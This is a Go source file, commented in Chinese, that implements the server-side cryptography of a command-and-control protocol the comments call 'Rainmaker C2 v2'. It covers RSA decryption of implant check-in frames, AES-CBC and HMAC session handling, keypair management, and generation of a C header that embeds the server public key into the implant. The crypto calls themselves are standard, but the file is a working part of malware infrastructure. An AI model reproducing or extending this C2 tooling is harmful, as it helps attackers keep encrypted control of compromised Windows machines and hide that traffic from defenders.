// csdev :: proto/crypto.go  --  协议 v2 密码学原语 (服务端侧)
//
// 与 docs/protocol_v2.md 第 1 节严格对齐:
//
//	密钥交换  RSA-2048 / PKCS#1 v1.5   (C 侧 CryptEncrypt, 本文件 DecryptPKCS1v15)
//	对称加密  AES-256-CBC + PKCS#7     (C 侧 kits/crypto/aes.c, 本文件 Encrypt/DecryptAESCBC)
//	完整性    HMAC-SHA256              (C 侧 kits/crypto/hmac.c, 本文件 HMACSHA256)
//	随机数    CSPRNG                   (C 侧 CryptGenRandom, 本文件 crypto/rand)
//
// 只使用 Go 标准库, 不引入任何第三方依赖 (go.mod 保持无 require)。
package proto

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// ---------------------------------------------------------------- 协议常量
const (
	AESKeySize      = 32  // 会话 AES-256 密钥长度 (协议 1.1)
	HMACKeySize     = 32  // 会话 HMAC 密钥长度 (协议 1.1)
	AESBlockSize    = 16  // AES 分组长度, 同时是 CBC 的 IV 长度
	HMACSize        = 32  // SHA-256 摘要长度
	IVSeedSize      = 16  // checkin 明文中的 iv_seed 保留字段长度 (协议 2.3)
	RSAModulusBytes = 256 // RSA-2048 模长, PUBLICKEYBLOB 中模数固定宽度
	RSAKeyBits      = 2048
)

// 服务端密钥对文件名 (协议 1.2: data/csdev.key + data/csdev.pub)
const (
	PrivKeyFile = "csdev.key"
	PubKeyFile  = "csdev.pub"
)

// CryptoAPI PUBLICKEYBLOB 常量 (协议 1.2, 全部小端)
const (
	blobTypePubKey = 0x06       // bType = PUBLICKEYBLOB
	blobVerPubKey  = 0x02       // bVersion
	calgRSAKeyX    = 0x0000A400 // aiKeyAlg = CALG_RSA_KEYX
	rsa1Magic      = 0x31415352 // magic = "RSA1"
	pubExpDefault  = 65537
)

// 哨兵错误, 便于调用方用 errors.Is 分流处理。
var (
	ErrPadding   = errors.New("proto: PKCS#7 填充非法")
	ErrTruncated = errors.New("proto: 数据截断")
	ErrHMAC      = errors.New("proto: HMAC 校验失败")
	ErrMagic     = errors.New("proto: 帧魔数错误")
)

// ---------------------------------------------------------------- RSA

// DecryptPKCS1v15 用 RSA 私钥解密 checkin 帧 body (协议 2.2 / 2.3)。
// 密文必须是完整的模长 (RSA-2048 为 256 字节), 与 C 侧 CryptEncrypt 输出一致。
func DecryptPKCS1v15(priv *rsa.PrivateKey, ct []byte) ([]byte, error) {
	if priv == nil {
		return nil, errors.New("proto: RSA 私钥为空")
	}
	if len(ct) != priv.Size() {
		return nil, fmt.Errorf("proto: RSA 密文长度 %d 非法 (期望 %d)", len(ct), priv.Size())
	}
	pt, err := rsa.DecryptPKCS1v15(rand.Reader, priv, ct)
	if err != nil {
		return nil, fmt.Errorf("proto: RSA 解密失败: %w", err)
	}
	return pt, nil
}

// ---------------------------------------------------------------- AES-CBC

// EncryptAESCBC 以随机 IV 做 AES-CBC + PKCS#7 加密。
// 返回 iv (16 字节) 与密文 (16 字节整数倍), 对应协议 2.2 的 [IV][密文] 前两段。
func EncryptAESCBC(key, plain []byte) (iv, ct []byte, err error) {
	iv = make([]byte, AESBlockSize)
	if _, err = rand.Read(iv); err != nil {
		return nil, nil, fmt.Errorf("proto: CSPRNG 失败: %w", err)
	}
	if ct, err = EncryptAESCBCWithIV(key, iv, plain); err != nil {
		return nil, nil, err
	}
	return iv, ct, nil
}

// EncryptAESCBCWithIV 与 EncryptAESCBC 相同, 但 IV 由调用方指定。
// 用于确定性场景 (交叉验证 C 侧向量、固定 IV 的回归测试)。
func EncryptAESCBCWithIV(key, iv, plain []byte) ([]byte, error) {
	if len(iv) != AESBlockSize {
		return nil, fmt.Errorf("proto: IV 长度 %d 非法 (期望 %d)", len(iv), AESBlockSize)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("proto: AES 密钥非法 (需 16/24/32 字节): %w", err)
	}
	buf := pkcs7Pad(plain)
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(buf, buf)
	return buf, nil
}

// DecryptAESCBC 解密 AES-256-CBC 密文并校验 PKCS#7 填充。
func DecryptAESCBC(key, iv, ct []byte) ([]byte, error) {
	if len(iv) != AESBlockSize {
		return nil, fmt.Errorf("proto: IV 长度 %d 非法 (期望 %d)", len(iv), AESBlockSize)
	}
	if len(ct) == 0 || len(ct)%AESBlockSize != 0 {
		return nil, fmt.Errorf("proto: 密文长度 %d 非法 (必须是 %d 的正整数倍)", len(ct), AESBlockSize)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("proto: AES 密钥非法 (需 16/24/32 字节): %w", err)
	}
	out := make([]byte, len(ct))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(out, ct)
	return pkcs7Unpad(out)
}

// pkcs7Pad 追加 PKCS#7 填充。明文长度整除分组时补满一整块 (与 C 侧一致)。
func pkcs7Pad(plain []byte) []byte {
	pad := AESBlockSize - len(plain)%AESBlockSize // 1..16
	out := make([]byte, len(plain)+pad)
	copy(out, plain)
	for i := len(plain); i < len(out); i++ {
		out[i] = byte(pad)
	}
	return out
}

// pkcs7Unpad 校验并剥离 PKCS#7 填充。返回的切片与入参共享底层数组。
func pkcs7Unpad(b []byte) ([]byte, error) {
	n := len(b)
	if n == 0 || n%AESBlockSize != 0 {
		return nil, fmt.Errorf("%w: 解密结果长度 %d 非法", ErrPadding, n)
	}
	pad := int(b[n-1])
	if pad == 0 || pad > AESBlockSize || pad > n {
		return nil, fmt.Errorf("%w: 末字节 0x%02X 超出 1..%d", ErrPadding, b[n-1], AESBlockSize)
	}
	for i := n - pad; i < n; i++ {
		if b[i] != byte(pad) {
			return nil, fmt.Errorf("%w: 偏移 %d 处为 0x%02X, 期望 0x%02X", ErrPadding, i, b[i], pad)
		}
	}
	return b[:n-pad], nil
}

// ---------------------------------------------------------------- HMAC

// HMACSHA256 计算 HMAC-SHA256(key, data)。
func HMACSHA256(key, data []byte) []byte {
	m := hmac.New(sha256.New, key)
	m.Write(data)
	return m.Sum(nil)
}

// hmacParts 对多段输入顺序拼接后计算 HMAC, 免去 "帧头||IV||密文" 的额外拼接缓冲。
func hmacParts(key []byte, parts ...[]byte) []byte {
	m := hmac.New(sha256.New, key)
	for _, p := range parts {
		m.Write(p)
	}
	return m.Sum(nil)
}

// ---------------------------------------------------------------- 密钥对

// GenerateKeypair 在 dir 下生成 RSA-2048 密钥对 (协议 1.2):
//
//	dir/csdev.key  PKCS#8 PEM 私钥
//	dir/csdev.pub  PKIX   PEM 公钥
//
// 幂等: 两个文件都已存在时直接返回, 不覆盖既有密钥 (已上线会话依赖既有密钥);
// 仅私钥存在时用私钥补齐公钥文件。
func GenerateKeypair(dir string) error {
	keyPath := filepath.Join(dir, PrivKeyFile)
	pubPath := filepath.Join(dir, PubKeyFile)

	haveKey, err := fileExists(keyPath)
	if err != nil {
		return fmt.Errorf("proto: 检查 %s 失败: %w", keyPath, err)
	}
	havePub, err := fileExists(pubPath)
	if err != nil {
		return fmt.Errorf("proto: 检查 %s 失败: %w", pubPath, err)
	}

	if haveKey && havePub {
		return nil // 幂等: 不动既有密钥
	}
	if havePub && !haveKey {
		return fmt.Errorf("proto: %s 存在但 %s 缺失, 公钥无法反推私钥, 请人工确认", pubPath, keyPath)
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return fmt.Errorf("proto: 创建目录 %s 失败: %w", dir, err)
	}

	if haveKey {
		priv, err := LoadKeypair(dir)
		if err != nil {
			return err
		}
		return writePubPEM(pubPath, &priv.PublicKey)
	}

	priv, err := rsa.GenerateKey(rand.Reader, RSAKeyBits)
	if err != nil {
		return fmt.Errorf("proto: 生成 RSA-%d 密钥失败: %w", RSAKeyBits, err)
	}
	if err := writePrivPEM(keyPath, priv); err != nil {
		return err
	}
	return writePubPEM(pubPath, &priv.PublicKey)
}

// LoadKeypair 读取 dir/csdev.key (PKCS#8 PEM, 兼容 PKCS#1)。
func LoadKeypair(dir string) (*rsa.PrivateKey, error) {
	keyPath := filepath.Join(dir, PrivKeyFile)
	raw, err := os.ReadFile(keyPath)
	if err != nil {
		return nil, fmt.Errorf("proto: 读取 %s 失败: %w", keyPath, err)
	}
	block, _ := pem.Decode(raw)
	if block == nil {
		return nil, fmt.Errorf("proto: %s 不是合法 PEM", keyPath)
	}
	switch block.Type {
	case "PRIVATE KEY":
		k, err := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err != nil {
			return nil, fmt.Errorf("proto: 解析 PKCS#8 私钥失败: %w", err)
		}
		priv, ok := k.(*rsa.PrivateKey)
		if !ok {
			return nil, fmt.Errorf("proto: %s 不是 RSA 私钥 (%T)", keyPath, k)
		}
		return priv, nil
	case "RSA PRIVATE KEY":
		priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
		if err != nil {
			return nil, fmt.Errorf("proto: 解析 PKCS#1 私钥失败: %w", err)
		}
		return priv, nil
	default:
		return nil, fmt.Errorf("proto: %s 的 PEM 类型 %q 不受支持", keyPath, block.Type)
	}
}

func fileExists(p string) (bool, error) {
	_, err := os.Stat(p)
	switch {
	case err == nil:
		return true, nil
	case errors.Is(err, os.ErrNotExist):
		return false, nil
	default:
		return false, err
	}
}

func writePrivPEM(path string, priv *rsa.PrivateKey) error {
	der, err := x509.MarshalPKCS8PrivateKey(priv)
	if err != nil {
		return fmt.Errorf("proto: 编码 PKCS#8 私钥失败: %w", err)
	}
	blk := pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: der})
	if err := os.WriteFile(path, blk, 0o600); err != nil {
		return fmt.Errorf("proto: 写入 %s 失败: %w", path, err)
	}
	return nil
}

func writePubPEM(path string, pub *rsa.PublicKey) error {
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return fmt.Errorf("proto: 编码 PKIX 公钥失败: %w", err)
	}
	blk := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der})
	if err := os.WriteFile(path, blk, 0o644); err != nil {
		return fmt.Errorf("proto: 写入 %s 失败: %w", path, err)
	}
	return nil
}

// ---------------------------------------------------------------- 公钥 blob

// PublicKeyBlob 按协议 1.2 节生成 CryptoAPI PUBLICKEYBLOB (全部小端, 共 276 字节):
//
//	偏移 长度 字段
//	0    1    bType    = 0x06 (PUBLICKEYBLOB)
//	1    1    bVersion = 0x02
//	2    2    reserved = 0x0000
//	4    4    aiKeyAlg = 0x0000A400 (CALG_RSA_KEYX)
//	8    4    magic    = "RSA1" (0x31415352)
//	12   4    bitlen   = 2048
//	16   4    pubexp   = 65537
//	20   256  模数, 小端 (big.Int 为大端, 此处做字节序反转)
//
// 契约固定 2048 位, 因此模数恒按 256 字节宽度编码; 公钥为空时返回 nil。
// C 侧可直接 CryptImportKey 导入, 无需解析。
func PublicKeyBlob(pub *rsa.PublicKey) []byte {
	if pub == nil || pub.N == nil {
		return nil
	}
	blob := make([]byte, 8+12+RSAModulusBytes)
	blob[0] = blobTypePubKey
	blob[1] = blobVerPubKey
	binary.LittleEndian.PutUint16(blob[2:4], 0) // reserved
	binary.LittleEndian.PutUint32(blob[4:8], calgRSAKeyX)
	binary.LittleEndian.PutUint32(blob[8:12], rsa1Magic)
	binary.LittleEndian.PutUint32(blob[12:16], uint32(RSAModulusBytes)*8)
	binary.LittleEndian.PutUint32(blob[16:20], uint32(pub.E))

	// big.Int.Bytes() 为大端; 取最低 256 字节后逐字节反转为小端
	be := pub.N.Bytes()
	if len(be) > RSAModulusBytes {
		be = be[len(be)-RSAModulusBytes:]
	}
	for i, b := range be {
		blob[20+len(be)-1-i] = b
	}
	return blob
}

// PubkeyFingerprint 返回公钥 blob 的 SHA-256 指纹 (十六进制小写), 用于日志核对。
func PubkeyFingerprint(blob []byte) string {
	sum := sha256.Sum256(blob)
	return hex.EncodeToString(sum[:])
}

// EmitPubkeyHeader 把 PUBLICKEYBLOB 写成 C 头文件 (协议 10 节的 --emit-pubkey 产物),
// 目录不存在时自动创建。生成内容形如:
//
//	/* Rainmaker C2 协议 v2 公钥 (...), 由服务端 --emit-pubkey 自动生成, 请勿手改 */
//	/* SHA-256 指纹: 3a7f...9c */
//	#define CSDEV_PUBKEY_LEN 276
//	static const unsigned char CSDEV_PUBKEY_BLOB[] = {0x06, 0x02, ...};
func EmitPubkeyHeader(path string, blob []byte) error {
	if len(blob) == 0 {
		return errors.New("proto: 公钥 blob 为空")
	}

	var b strings.Builder
	fmt.Fprintf(&b, "/* Rainmaker C2 协议 v2 公钥: %d 字节 CryptoAPI PUBLICKEYBLOB */\n", len(blob))
	b.WriteString("/* 由 csdev-server.exe --emit-pubkey 自动生成, 请勿手改; 换密钥后必须重编译植入体 */\n")
	fmt.Fprintf(&b, "/* SHA-256 指纹: %s */\n", PubkeyFingerprint(blob))
	b.WriteString("#ifndef CSDEV_PUBKEY_H\n#define CSDEV_PUBKEY_H\n\n")
	fmt.Fprintf(&b, "#define CSDEV_PUBKEY_LEN %d\n\n", len(blob))
	b.WriteString("static const unsigned char CSDEV_PUBKEY_BLOB[] = {\n")
	for i, c := range blob {
		if i%12 == 0 {
			b.WriteString("    ")
		}
		fmt.Fprintf(&b, "0x%02X,", c)
		if i%12 == 11 || i == len(blob)-1 {
			b.WriteString("\n")
		} else {
			b.WriteString(" ")
		}
	}
	b.WriteString("};\n\n#endif /* CSDEV_PUBKEY_H */\n")

	if dir := filepath.Dir(path); dir != "" {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return fmt.Errorf("proto: 创建目录 %s 失败: %w", dir, err)
		}
	}
	if err := os.WriteFile(path, []byte(b.String()), 0o644); err != nil {
		return fmt.Errorf("proto: 写入 %s 失败: %w", path, err)
	}
	return nil
}
